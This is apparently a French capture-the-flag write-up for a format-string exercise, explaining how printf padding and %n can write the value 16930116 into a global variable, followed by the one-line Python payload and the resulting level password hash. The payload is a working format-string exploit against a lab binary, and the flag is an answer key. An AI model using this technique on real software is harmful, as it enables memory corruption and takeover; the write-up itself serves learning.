## GET Flag

Très semblable à l'exercice précédent, une difficulté vient s'ajouter. Il est nécessaire d'assigner à la variable globale `m` la valeur: 16930116.
L'option: "%n" assignant le nombre de caractères précédement écrits, il est difficile d'écrire autant dans un buffer de 512.

Cependant, printf permet à l'utilisateur d'ajouter une quantité précise d'espaces grace au padding.
Il est de ce fait possible d'insérer plusieurs milliards de caractères dans un buffer de taille réduite.

`python -c 'print "\x10\x98\x04\x08" + "%10x"*10 + "%16930012x" + "%n"' > exploit`

### Flag

```
level5
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
